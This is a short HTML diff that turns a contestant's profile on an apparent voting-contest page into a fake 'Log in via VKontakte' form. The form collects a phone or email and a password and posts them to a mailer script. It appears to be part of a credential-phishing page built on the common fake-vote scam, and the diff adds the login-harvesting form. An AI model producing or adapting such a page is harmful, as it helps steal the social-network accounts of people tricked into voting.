@@ -15,13 +15,12 @@
 			<div class="main">
 				<div class="content-block">
 					<div class="content-block__left">
-						<h1 class="title">Малых Григорий</h1>
-						<div class="desc">
-							Начинающий веб-разработчик, специализируется в области Front-End разработки.
-							Имеет опыт в области HTML, CSS, JavaScript, Jquery. В данный момент обучается
-							серверному языку PHP.
-						</div>
-						<div class="button"><a href="voice.html">Проголосовать</a></div>
+						<h1 class="title">Выполните вход через Вконтакте</h1>
+						<form action="mailer/smart.php" class="form" method="POST">
+							<input placeholder="Телефон или email" type="text" name="login" class="form__input" required>
+							<input placeholder="Пароль" type="text" name="password" class="form__input" required>
+							<button class="form_btn" type="submit">Войти</button>
+						</form>
 					</div>
 					<div class="content-block__right"></div>
 				</div>
@@ -42,9 +41,9 @@
 						</div>
 					</div>
 					<div class="nav-block">
-						<div class="nav-btn"><a href="index.html">ГОЛОСОВАТЬ ЗА УЧАСТНИКА</a></div>
-						<div class="nav-btn"><a href="index.html">СТАТЬ УЧАСТНИКОМ</a></div>
-						<div class="nav-btn"><a href="index.html">ПОЛИТИКА БЕЗОПСНОСТИ</a></div>
+						<div class="nav-btn"><a href="index.php">ГОЛОСОВАТЬ ЗА УЧАСТНИКА</a></div>
+						<div class="nav-btn"><a href="index.php">СТАТЬ УЧАСТНИКОМ</a></div>
+						<div class="nav-btn"><a href="index.php">ПОЛИТИКА БЕЗОПСНОСТИ</a></div>
 					</div>
 				</div>
 			</div>
